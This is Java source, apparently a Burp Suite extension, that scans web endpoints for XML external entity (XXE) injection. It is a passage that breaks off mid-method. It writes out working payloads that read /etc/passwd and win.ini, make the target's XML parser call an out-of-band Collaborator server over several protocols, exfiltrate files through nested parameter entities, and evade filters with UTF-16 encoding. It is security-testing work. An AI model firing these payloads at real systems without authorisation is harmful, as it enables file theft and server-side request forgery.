    private void passiveAnalysis(HttpRequestResponse requestResponse, String url, String contentType) {
        HttpRequest request = requestResponse.request();
        HttpResponse response = requestResponse.response();

        // Detect XML content type in the request
        if (isXmlContentType(contentType)) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "XML Content-Type detected in request",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url).parameter("Content-Type")
                    .evidence("Content-Type: " + contentType)
                    .description("The request uses an XML content type (" + contentType + "). "
                            + "This endpoint accepts XML input and may be susceptible to XXE injection "
                            + "if the XML parser is not configured to disable external entity processing.")
                    .requestResponse(requestResponse)
                    .build());
        }

        // Detect existing DTD declarations in the request body
        String body = null;
        try {
            body = request.bodyToString();
        } catch (Exception ignored) {}

        if (body != null && !body.isEmpty()) {
            if (body.contains("<!DOCTYPE") || body.contains("<!ENTITY")) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "DTD declaration found in request body",
                                Severity.LOW, Confidence.CERTAIN)
                        .url(url).parameter("request_body")
                        .evidence("Request body contains DTD declaration (<!DOCTYPE or <!ENTITY)")
                        .description("The request body contains a Document Type Definition. "
                                + "This suggests the application processes XML with DTDs, which may allow "
                                + "XXE attacks if external entity processing is not disabled.")
                        .requestResponse(requestResponse)
                        .build());
            }
        }

        // Detect XML parsing errors in the response
        if (response != null) {
            String responseBody = null;
            try {
                responseBody = response.bodyToString();
            } catch (Exception ignored) {}

            if (responseBody != null && XML_PARSER_ERROR_PATTERN.matcher(responseBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XML parser error detected in response",
                                Severity.LOW, Confidence.FIRM)
                        .url(url)
                        .evidence("Response contains XML parser error message")
                        .description("The response contains an XML parser error message, revealing that "
                                + "the server uses an XML parser. This endpoint may be vulnerable to XXE "
                                + "if the parser allows external entity processing.")
                        .requestResponse(requestResponse)
                        .build());
            }
        }

        // Detect SAML XML context (high-value XXE target)
        boolean hasSamlParam = false;
        for (var param : request.parameters()) {
            if ("SAMLRequest".equalsIgnoreCase(param.name())
                    || "SAMLResponse".equalsIgnoreCase(param.name())) {
                hasSamlParam = true;
                break;
            }
        }
        if (hasSamlParam
                || (body != null && body.contains("urn:oasis:names:tc:SAML"))
                || (body != null && (body.contains("samlp:") || body.contains("saml2p:")))) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "SAML XML context detected",
                            Severity.INFO, Confidence.CERTAIN)
                    .url(url).parameter(hasSamlParam ? "SAMLRequest/SAMLResponse" : "request_body")
                    .evidence("SAML protocol detected — XML-based authentication flow")
                    .description("This endpoint handles SAML XML messages. SAML processors are a common "
                            + "target for XXE injection because they must parse untrusted XML. "
                            + "If the SAML library does not disable external entity processing, "
                            + "XXE attacks can extract sensitive data or perform SSRF. "
                            + "Test this endpoint with both classic and OOB XXE payloads.")
                    .requestResponse(requestResponse)
                    .build());
        }
    }

    // ==================== PHASE 1: XML BODY TESTING ====================

    /**
     * Tests XXE injection when the request already has an XML content type.
     * Applies classic file read, error-based, and blind OOB payloads to the XML body.
     */
    private void testXmlBody(HttpRequestResponse original, String url,
                              TargetFingerprint fingerprint) throws InterruptedException {
        String requestBody = original.request().bodyToString();
        if (requestBody == null || requestBody.trim().isEmpty()) return;

        // Get baseline response for comparison
        HttpRequestResponse baseline = sendRawRequest(original, requestBody);
        String baselineBody = (baseline != null && baseline.response() != null)
                ? baseline.response().bodyToString() : "";

        // Determine XML context
        boolean isSoap = requestBody.contains("<soap:") || requestBody.contains("<SOAP-ENV:")
                || requestBody.contains("soap:Envelope") || requestBody.contains("soapenv:");

        // Detect if endpoint is blind (doesn't reflect XML content).
        // Blind endpoints can't yield classic file-read results — those would be
        // false positives from incidental response differences. Prioritize OOB instead.
        boolean blind = isBlindEndpoint(original, requestBody);
        if (blind) {
            api.logging().logToOutput("[XXE] Endpoint appears blind — prioritizing OOB, skipping classic file read.");
        }

        if (blind) {
            // Blind endpoint: error-based first (cheap, reveals parser), then OOB (primary)
            if (config.getBool("xxe.classic.enabled", true)) {
                testErrorBasedXxe(original, url, requestBody, baselineBody);
            }
            if (config.getBool("xxe.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testBlindXxeOob(original, url, requestBody);
            }
        } else {
            // Reflective endpoint: classic file read is viable (fingerprint-aware)
            if (config.getBool("xxe.classic.enabled", true)) {
                testClassicXxeFileRead(original, url, requestBody, baselineBody, isSoap, fingerprint);
            }
            if (config.getBool("xxe.classic.enabled", true)) {
                testErrorBasedXxe(original, url, requestBody, baselineBody);
            }
            if (config.getBool("xxe.oob.enabled", true)
                    && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testBlindXxeOob(original, url, requestBody);
            }
        }

        // Bypass phases: UTF-16 encoding and double-encoded entities
        // These run regardless of blind/reflective since they test filter evasion
        if (config.getBool("xxe.bypass.enabled", true)) {
            testUtf16Bypass(original, url, baselineBody, fingerprint);
            testDoubleEncodedBypass(original, url, requestBody, baselineBody, fingerprint);
        }
    }

    // ==================== PHASE 1a: CLASSIC XXE FILE READ ====================

    /**
     * Attempts to read well-known files on Linux and Windows via XML external entities.
     * Uses SYSTEM and PUBLIC DTD syntaxes, and tests both standalone XML and SOAP bodies.
     */
    private void testClassicXxeFileRead(HttpRequestResponse original, String url,
                                         String requestBody, String baselineBody,
                                         boolean isSoap,
                                         TargetFingerprint fingerprint) throws InterruptedException {
        // Fingerprint-aware target selection:
        //   Known OS   → full file list for that OS only (skip the irrelevant OS entirely)
        //   Unknown OS → minimal high-confidence subset from both (3 files each)
        // This dramatically reduces requests and eliminates cross-OS false positives.
        String[][] linuxTargets = getLinuxTargets(fingerprint);
        String[][] windowsTargets = getWindowsTargets(fingerprint);

        api.logging().logToOutput("[XXE] File read targets: " + linuxTargets.length
                + " Linux + " + windowsTargets.length + " Windows (OS=" + fingerprint.os + ")");

        for (String[] target : linuxTargets) {
            testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
                    target[0], target[1], target[2], "Linux");
        }

        for (String[] target : windowsTargets) {
            testFileReadPayloads(original, url, requestBody, baselineBody, isSoap,
                    target[0], target[1], target[2], "Windows");
        }
    }

    /**
     * Generates and sends multiple DTD-based file read payloads for a given target file.
     * Tests SYSTEM entity, PUBLIC entity, and SOAP-wrapped variants.
     */
    private void testFileReadPayloads(HttpRequestResponse original, String url,
                                       String requestBody, String baselineBody,
                                       boolean isSoap, String filePath,
                                       String evidencePattern, String fileDescription,
                                       String osType) throws InterruptedException {

        String entityName = "xxetest";

        // Payload variant 1: SYSTEM entity - prepend DTD to existing body
        String systemDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n";
        String systemPayloadBody = injectDtdIntoXml(requestBody, systemDtd, "&" + entityName + ";");
        testSingleFileReadPayload(original, url, systemPayloadBody, baselineBody,
                evidencePattern, fileDescription, osType, "SYSTEM entity", filePath);

        perHostDelay();

        // Payload variant 2: PUBLIC entity - prepend DTD to existing body
        String publicDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " PUBLIC \"any\" \"file://" + filePath + "\">\n"
                + "]>\n";
        String publicPayloadBody = injectDtdIntoXml(requestBody, publicDtd, "&" + entityName + ";");
        testSingleFileReadPayload(original, url, publicPayloadBody, baselineBody,
                evidencePattern, fileDescription, osType, "PUBLIC entity", filePath);

        perHostDelay();

        // Payload variant 3: Standalone XML body (in case the original body is not well-formed)
        String standaloneXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                + "<!DOCTYPE foo [\n"
                + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                + "]>\n"
                + "<foo>&" + entityName + ";</foo>";
        testSingleFileReadPayload(original, url, standaloneXml, baselineBody,
                evidencePattern, fileDescription, osType, "Standalone XML SYSTEM", filePath);

        perHostDelay();

        // Payload variant 4: SOAP-specific payload (if original request is SOAP)
        if (isSoap) {
            String soapXxeBody = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY " + entityName + " SYSTEM \"file://" + filePath + "\">\n"
                    + "]>\n"
                    + injectEntityReferenceIntoSoap(requestBody, "&" + entityName + ";");
            testSingleFileReadPayload(original, url, soapXxeBody, baselineBody,
                    evidencePattern, fileDescription, osType, "SOAP SYSTEM entity", filePath);

            perHostDelay();
        }
    }

    /**
     * Sends a single file-read XXE payload and checks the response for evidence of file content.
     */
    private void testSingleFileReadPayload(HttpRequestResponse original, String url,
                                            String payloadBody, String baselineBody,
                                            String evidencePattern, String fileDescription,
                                            String osType, String technique,
                                            String filePath) {
        HttpRequestResponse result = sendRawRequest(original, payloadBody);
        if (result == null || result.response() == null) return;

        String responseBody = result.response().bodyToString();
        if (responseBody == null) return;

        // Only report if we find evidence of actual file content not present in baseline
        boolean confirmed = false;
        String matchedEvidence = "";

        if (!evidencePattern.isEmpty()) {
            // Use the specific evidence pattern — but guard against empty baseline
            boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
            if (responseBody.contains(evidencePattern)
                    && (baselineEmpty ? result.response().statusCode() == 200 : !baselineBody.contains(evidencePattern))) {
                confirmed = true;
                matchedEvidence = evidencePattern;
            }
        } else {
            // For files without a fixed evidence pattern (e.g., /etc/hostname),
            // check if the response changed significantly and contains plausible output.
            // Require non-empty baseline to avoid FPs when baseline request failed.
            if (baselineBody != null && !baselineBody.isEmpty()
                    && !responseBody.equals(baselineBody)
                    && responseBody.length() != baselineBody.length()
                    && result.response().statusCode() == 200) {
                // /etc/hostname typically returns a short hostname string.
                // We additionally verify the response differs from baseline by content.
                String diff = findNewContent(baselineBody, responseBody);
                if (diff != null && diff.length() > 0 && diff.length() < 256
                        && !XML_PARSER_ERROR_PATTERN.matcher(diff).find()) {
                    confirmed = true;
                    matchedEvidence = "New content in response: " + diff.substring(0, Math.min(100, diff.length()));
                }
            }
        }

        // Secondary confirmation: check for the well-known Linux passwd file pattern
        if (!confirmed && filePath.equals("/etc/passwd")) {
            if (LINUX_PASSWD_EVIDENCE.matcher(responseBody).find()
                    && !LINUX_PASSWD_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "root:x:0:0: pattern found";
            }
        }

        // Secondary confirmation: check for Windows win.ini pattern
        if (!confirmed && filePath.contains("win.ini")) {
            if (WINDOWS_WIN_INI_EVIDENCE.matcher(responseBody).find()
                    && !WINDOWS_WIN_INI_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "[fonts] section found";
            }
        }

        // Secondary confirmation: check for Windows hosts file pattern
        if (!confirmed && filePath.contains("hosts")) {
            if (WINDOWS_HOSTS_EVIDENCE.matcher(responseBody).find()
                    && !WINDOWS_HOSTS_EVIDENCE.matcher(baselineBody).find()) {
                confirmed = true;
                matchedEvidence = "localhost entry found";
            }
        }

        if (confirmed) {
            findingsStore.addFinding(Finding.builder("xxe-scanner",
                            "XXE File Read: " + fileDescription + " (" + osType + ")",
                            Severity.CRITICAL, Confidence.CERTAIN)
                    .url(url).parameter("xml_body")
                    .evidence("Technique: " + technique + " | File: " + filePath
                            + " | Evidence: " + matchedEvidence)
                    .description("XML External Entity injection confirmed. The XML parser resolved "
                            + "an external SYSTEM entity pointing to " + fileDescription + " and "
                            + "returned the file content in the response. "
                            + "Technique used: " + technique + ". "
                            + "Remediation: Disable external entity processing in the XML parser. "
                            + "For Java: set XMLConstants.FEATURE_SECURE_PROCESSING, disable DTDs. "
                            + "For .NET: use XmlReaderSettings with DtdProcessing.Prohibit. "
                            + "For PHP: use libxml_disable_entity_loader(true).")
                    .requestResponse(result)
                    .build());
            api.logging().logToOutput("[XXE] File read confirmed: " + fileDescription
                    + " at " + url + " via " + technique);
        }
    }

    // ==================== PHASE 1b: ERROR-BASED XXE ====================

    /**
     * Tests error-based XXE: references non-existent files and uses malformed entities
     * to trigger parser errors that reveal the XML parser processes external entities.
     */
    private void testErrorBasedXxe(HttpRequestResponse original, String url,
                                    String requestBody, String baselineBody) throws InterruptedException {

        // Error payload 1: Reference a non-existent file to trigger a file-not-found error
        String nonExistentFileDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe SYSTEM \"file:///nonexistent/xxe_probe_" + System.currentTimeMillis() + "\">\n"
                + "]>\n";
        String nonExistentPayload = injectDtdIntoXml(requestBody, nonExistentFileDtd, "&xxe;");
        HttpRequestResponse nonExistentResult = sendRawRequest(original, nonExistentPayload);

        if (nonExistentResult != null && nonExistentResult.response() != null) {
            String responseBody = nonExistentResult.response().bodyToString();
            if (responseBody != null
                    && DTD_PROCESSING_ERROR_PATTERN.matcher(responseBody).find()
                    && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Error-Based: XML parser processes external entities",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter("xml_body")
                        .evidence("Non-existent file entity triggered parser error confirming entity processing")
                        .description("The XML parser attempted to resolve an external SYSTEM entity "
                                + "pointing to a non-existent file, producing an error that confirms "
                                + "external entity processing is enabled. This is a strong indicator "
                                + "of XXE vulnerability even though no file was read. "
                                + "Remediation: Disable DTD processing and external entity resolution.")
                        .requestResponse(nonExistentResult)
                        .build());
            }
        }

        perHostDelay();

        // Error payload 2: Malformed entity definition to detect XML parser
        String malformedDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY % xxe SYSTEM \"file:///\">\n"
                + "  %xxe;\n"
                + "]>\n";
        String malformedPayload = injectDtdIntoXml(requestBody, malformedDtd, "");
        HttpRequestResponse malformedResult = sendRawRequest(original, malformedPayload);

        if (malformedResult != null && malformedResult.response() != null) {
            String responseBody = malformedResult.response().bodyToString();
            if (responseBody != null
                    && DTD_PROCESSING_ERROR_PATTERN.matcher(responseBody).find()
                    && !DTD_PROCESSING_ERROR_PATTERN.matcher(baselineBody).find()) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Error-Based: Parameter entity processing confirmed",
                                Severity.HIGH, Confidence.FIRM)
                        .url(url).parameter("xml_body")
                        .evidence("Malformed parameter entity triggered parser error confirming DTD processing")
                        .description("The XML parser processed a parameter entity definition within the DTD, "
                                + "confirming that DTD processing and external entity resolution are enabled. "
                                + "Remediation: Disable DTD processing entirely.")
                        .requestResponse(malformedResult)
                        .build());
            }
        }

        perHostDelay();

        // Error payload 3: Recursive entity expansion to detect parser limits
        String recursiveEntityDtd = "<!DOCTYPE foo [\n"
                + "  <!ENTITY xxe \"XXE_PROBE_CONFIRMED\">\n"
                + "]>\n";
        String recursivePayload = injectDtdIntoXml(requestBody, recursiveEntityDtd, "&xxe;");
        HttpRequestResponse recursiveResult = sendRawRequest(original, recursivePayload);

        if (recursiveResult != null && recursiveResult.response() != null) {
            String responseBody = recursiveResult.response().bodyToString();
            if (responseBody != null
                    && responseBody.contains("XXE_PROBE_CONFIRMED")
                    && !baselineBody.contains("XXE_PROBE_CONFIRMED")) {
                findingsStore.addFinding(Finding.builder("xxe-scanner",
                                "XXE Confirmed: Internal entity expansion works",
                                Severity.HIGH, Confidence.CERTAIN)
                        .url(url).parameter("xml_body")
                        .evidence("Internal entity &xxe; expanded to 'XXE_PROBE_CONFIRMED' in response")
                        .description("The XML parser expands internal entity definitions. "
                                + "While this alone proves entity processing is enabled, it strongly "
                                + "suggests external entities (SYSTEM/PUBLIC) may also be processed. "
                                + "Remediation: Disable DTD processing and entity expansion.")
                        .requestResponse(recursiveResult)
                        .build());
            }
        }

        perHostDelay();
    }

    // ==================== PHASE 1c: BLIND XXE VIA OOB (COLLABORATOR) ====================

    /**
     * Tests blind XXE using Burp Collaborator for out-of-band detection.
     * Includes parameter entity with external DTD, direct entity callback,
     * and data exfiltration via parameter entities.
     */
    private void testBlindXxeOob(HttpRequestResponse original, String url,
                                  String requestBody) throws InterruptedException {

        // OOB Payload 1: Parameter entity loading external DTD from Collaborator
        AtomicReference<HttpRequestResponse> sentRequest1 = new AtomicReference<>();
        String collabPayload1 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB parameter entity external DTD",
                interaction -> reportOobFinding(interaction, url, "Parameter entity external DTD load", sentRequest1.get()));
        if (collabPayload1 != null) {
            String paramEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload1 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String paramEntityPayload = injectDtdIntoXml(requestBody, paramEntityDtd, "");
            HttpRequestResponse result1 = sendRawRequest(original, paramEntityPayload);
            sentRequest1.set(result1);
            perHostDelay();
        }

        // OOB Payload 2: Direct entity callback to Collaborator
        AtomicReference<HttpRequestResponse> sentRequest2 = new AtomicReference<>();
        String collabPayload2 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB direct entity callback",
                interaction -> reportOobFinding(interaction, url, "Direct entity HTTP callback", sentRequest2.get()));
        if (collabPayload2 != null) {
            String directEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload2 + "/xxe\">\n"
                    + "]>\n";
            String directEntityPayload = injectDtdIntoXml(requestBody, directEntityDtd, "&xxe;");
            HttpRequestResponse result2 = sendRawRequest(original, directEntityPayload);
            sentRequest2.set(result2);
            perHostDelay();
        }

        // OOB Payload 3: Parameter entity with HTTPS callback
        AtomicReference<HttpRequestResponse> sentRequest3 = new AtomicReference<>();
        String collabPayload3 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB parameter entity HTTPS",
                interaction -> reportOobFinding(interaction, url, "Parameter entity HTTPS callback", sentRequest3.get()));
        if (collabPayload3 != null) {
            String httpsParamEntityDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"https://" + collabPayload3 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String httpsPayload = injectDtdIntoXml(requestBody, httpsParamEntityDtd, "");
            HttpRequestResponse result3 = sendRawRequest(original, httpsPayload);
            sentRequest3.set(result3);
            perHostDelay();
        }

        // OOB Payload 4: Data exfiltration via nested parameter entities
        // This technique uses a parameter entity to read a file, then sends its
        // content as part of a URL to the Collaborator server.
        AtomicReference<HttpRequestResponse> sentRequest4 = new AtomicReference<>();
        String collabPayload4 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB data exfiltration via parameter entity",
                interaction -> reportOobFinding(interaction, url, "Data exfiltration via parameter entity", sentRequest4.get()));
        if (collabPayload4 != null) {
            String exfilDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/hostname\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload4 + "/xxe\">\n"
                    + "  %dtd;\n"
                    + "]>\n";
            String exfilPayload = injectDtdIntoXml(requestBody, exfilDtd, "");
            HttpRequestResponse result4 = sendRawRequest(original, exfilPayload);
            sentRequest4.set(result4);
            perHostDelay();
        }

        // OOB Payload 5: Standalone XML with OOB parameter entity
        AtomicReference<HttpRequestResponse> sentRequest5 = new AtomicReference<>();
        String collabPayload5 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB standalone parameter entity",
                interaction -> reportOobFinding(interaction, url, "Standalone XML parameter entity OOB", sentRequest5.get()));
        if (collabPayload5 != null) {
            String standaloneOobXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"http://" + collabPayload5 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n"
                    + "<foo>test</foo>";
            HttpRequestResponse result5 = sendRawRequest(original, standaloneOobXml);
            sentRequest5.set(result5);
            perHostDelay();
        }

        // OOB Payload 6: Direct entity callback via standalone XML
        AtomicReference<HttpRequestResponse> sentRequest6 = new AtomicReference<>();
        String collabPayload6 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB standalone direct entity",
                interaction -> reportOobFinding(interaction, url, "Standalone XML direct entity OOB", sentRequest6.get()));
        if (collabPayload6 != null) {
            String standaloneDirectXml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
                    + "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"http://" + collabPayload6 + "/xxe\">\n"
                    + "]>\n"
                    + "<foo>&xxe;</foo>";
            HttpRequestResponse result6 = sendRawRequest(original, standaloneDirectXml);
            sentRequest6.set(result6);
            perHostDelay();
        }

        // OOB Payload 7: FTP protocol for blind exfiltration
        AtomicReference<HttpRequestResponse> sentRequest7 = new AtomicReference<>();
        String collabPayload7 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB FTP exfiltration",
                interaction -> reportOobFinding(interaction, url, "FTP-based OOB exfiltration", sentRequest7.get()));
        if (collabPayload7 != null) {
            String ftpDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"ftp://" + collabPayload7 + "/xxe\">\n"
                    + "  %dtd;\n"
                    + "]>\n";
            String ftpPayload = injectDtdIntoXml(requestBody, ftpDtd, "");
            HttpRequestResponse result7 = sendRawRequest(original, ftpPayload);
            sentRequest7.set(result7);
            perHostDelay();
        }

        // OOB Payload 8: JAR protocol (Java-specific)
        AtomicReference<HttpRequestResponse> sentRequest8 = new AtomicReference<>();
        String collabPayload8 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB JAR protocol",
                interaction -> reportOobFinding(interaction, url, "JAR protocol OOB callback", sentRequest8.get()));
        if (collabPayload8 != null) {
            String jarDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"jar:http://" + collabPayload8 + "/xxe!/test\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String jarPayload = injectDtdIntoXml(requestBody, jarDtd, "");
            HttpRequestResponse result8 = sendRawRequest(original, jarPayload);
            sentRequest8.set(result8);
            perHostDelay();
        }

        // OOB Payload 9: netdoc protocol (Java-specific)
        AtomicReference<HttpRequestResponse> sentRequest9 = new AtomicReference<>();
        String collabPayload9 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB netdoc protocol",
                interaction -> reportOobFinding(interaction, url, "netdoc protocol OOB callback", sentRequest9.get()));
        if (collabPayload9 != null) {
            String netdocDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"netdoc://" + collabPayload9 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String netdocPayload = injectDtdIntoXml(requestBody, netdocDtd, "");
            HttpRequestResponse result9 = sendRawRequest(original, netdocPayload);
            sentRequest9.set(result9);
            perHostDelay();
        }

        // OOB Payload 10: gopher protocol
        AtomicReference<HttpRequestResponse> sentRequest10 = new AtomicReference<>();
        String collabPayload10 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB gopher protocol",
                interaction -> reportOobFinding(interaction, url, "gopher protocol OOB callback", sentRequest10.get()));
        if (collabPayload10 != null) {
            String gopherDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"gopher://" + collabPayload10 + ":70/_xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String gopherPayload = injectDtdIntoXml(requestBody, gopherDtd, "");
            HttpRequestResponse result10 = sendRawRequest(original, gopherPayload);
            sentRequest10.set(result10);
            perHostDelay();
        }

        // OOB Payload 11: PHP filter chain
        AtomicReference<HttpRequestResponse> sentRequest11 = new AtomicReference<>();
        String collabPayload11 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB PHP filter chain",
                interaction -> reportOobFinding(interaction, url, "PHP filter chain OOB callback", sentRequest11.get()));
        if (collabPayload11 != null) {
            String phpFilterDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % xxe SYSTEM \"php://filter/convert.base64-encode/resource=http://"
                    + collabPayload11 + "/xxe\">\n"
                    + "  %xxe;\n"
                    + "]>\n";
            String phpFilterPayload = injectDtdIntoXml(requestBody, phpFilterDtd, "");
            HttpRequestResponse result11 = sendRawRequest(original, phpFilterPayload);
            sentRequest11.set(result11);
            perHostDelay();
        }

        // OOB Payload 12: PHP expect wrapper
        AtomicReference<HttpRequestResponse> sentRequest12 = new AtomicReference<>();
        String collabPayload12 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB PHP expect wrapper",
                interaction -> reportOobFinding(interaction, url, "PHP expect wrapper OOB callback", sentRequest12.get()));
        if (collabPayload12 != null) {
            String phpExpectDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY xxe SYSTEM \"expect://nslookup+" + collabPayload12 + "\">\n"
                    + "]>\n";
            String phpExpectPayload = injectDtdIntoXml(requestBody, phpExpectDtd, "&xxe;");
            HttpRequestResponse result12 = sendRawRequest(original, phpExpectPayload);
            sentRequest12.set(result12);
            perHostDelay();
        }

        // OOB Payload 13: Data exfiltration of /etc/passwd via nested parameter entities + external DTD
        AtomicReference<HttpRequestResponse> sentRequest13 = new AtomicReference<>();
        String collabPayload13 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB /etc/passwd exfiltration via external DTD",
                interaction -> reportOobFinding(interaction, url,
                        "Data exfiltration /etc/passwd via external DTD + nested param entities", sentRequest13.get()));
        if (collabPayload13 != null) {
            String exfilPasswdDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///etc/passwd\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload13 + "/xxe.dtd\">\n"
                    + "  %dtd;\n"
                    + "  %send;\n"
                    + "]>\n";
            // The external DTD at the Collaborator server would define:
            // <!ENTITY % send "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?data=%file;'>">
            // This payload triggers the DNS/HTTP interaction regardless of DTD content
            String exfilPasswdPayload = injectDtdIntoXml(requestBody, exfilPasswdDtd, "");
            HttpRequestResponse result13 = sendRawRequest(original, exfilPasswdPayload);
            sentRequest13.set(result13);
            perHostDelay();
        }

        // OOB Payload 14: Data exfiltration of C:/Windows/win.ini via nested parameter entities
        AtomicReference<HttpRequestResponse> sentRequest14 = new AtomicReference<>();
        String collabPayload14 = collaboratorManager.generatePayload(
                "xxe-scanner", url, "xml_body", "XXE OOB win.ini exfiltration via external DTD",
                interaction -> reportOobFinding(interaction, url,
                        "Data exfiltration C:/Windows/win.ini via external DTD + nested param entities", sentRequest14.get()));
        if (collabPayload14 != null) {
            String exfilWinIniDtd = "<!DOCTYPE foo [\n"
                    + "  <!ENTITY % file SYSTEM \"file:///C:/Windows/win.ini\">\n"
                    + "  <!ENTITY % dtd SYSTEM \"http://" + collabPayload14 + "/xxe.dtd\">\n"
                    + "  %dtd;\n"
                    + "  %send;\n"
                    + "]>\n";
            String exfilWinIniPayload = injectDtdIntoXml(requestBody, exfilWinIniDtd, "");
            HttpRequestResponse result14 = sendRawRequest(original, exfilWinIniPayload);
            sentRequest14.set(result14);
            perHostDelay();
        }
    }

    /**
     * Reports a confirmed OOB XXE finding from a Collaborator interaction.
     * Overload without requestResponse for backward compatibility.
     */
    private void reportOobFinding(Interaction interaction, String url, String technique) {
        reportOobFinding(interaction, url, technique, null);
    }

    /**
     * Reports a confirmed OOB XXE finding from a Collaborator interaction,
     * attaching the original HTTP request/response that triggered the callback.
     */
    private void reportOobFinding(Interaction interaction, String url, String technique,
                                   HttpRequestResponse requestResponse) {
        Finding.Builder builder = Finding.builder("xxe-scanner",
                        "XXE Confirmed (Out-of-Band): " + technique,
                        Severity.CRITICAL, Confidence.CERTAIN)
                .url(url).parameter("xml_body")
                .evidence("Technique: " + technique
                        + " | Collaborator " + interaction.type().name()
                        + " interaction from " + interaction.clientIp()
                        + " at " + interaction.timeStamp())
                .description("XML External Entity injection confirmed via Burp Collaborator. "
                        + "The XML parser resolved an external entity and made an outbound "
                        + interaction.type().name() + " request to the Collaborator server. "
                        + "Technique: " + technique + ". "
                        + "This confirms the parser processes external entities. "
                        + "An attacker can use this to read arbitrary files from the server, "
                        + "perform SSRF, or exfiltrate data. "
                        + "Remediation: Disable external entity processing and DTDs in the XML parser.");
        if (requestResponse != null) {
            builder.requestResponse(requestResponse);
        }
        findingsStore.addFinding(builder.build());
        api.logging().logToOutput("[XXE OOB] Confirmed! " + technique + " at " + url
                + " | " + interaction.type().name() + " from " + interaction.clientIp());
    }

    // ==================== PHASE 1d: UTF-16 ENCODING BYPASS ====================

    /**
     * Tests XXE payloads encoded in UTF-16 to bypass WAFs and parsers that only
     * inspect UTF-8 content. Some XML parsers honor the encoding declaration and
     * process UTF-16 encoded payloads even when UTF-8 DOCTYPE patterns are blocked.
     * Uses fingerprint to choose the right file target (Linux vs Windows).
     */
    private void testUtf16Bypass(HttpRequestResponse original, String url,
                                  String baselineBody,
                                  TargetFingerprint fingerprint) throws InterruptedException {

        // Select file targets based on fingerprint
        String linuxFile = "/etc/passwd";
        Pattern linuxEvidence = LINUX_PASSWD_EVIDENCE;
        String winFile = "C:/Windows/win.ini";
        Pattern winEvidence = WINDOWS_WIN_INI_EVIDENCE;

        boolean testLinux = fingerprint.os != DetectedOS.WINDOWS;
        boolean testWindows = fingerprint.os != DetectedOS.LINUX;

        // UTF-16 LE with BOM — Linux target
        if (testLinux) {
            testUtf16Payload(original, url, baselineBody, linuxFile, linuxEvidence,
                    "UTF-16 LE", "Linux",
                    new byte[]{(byte) 0xFF, (byte) 0xFE},
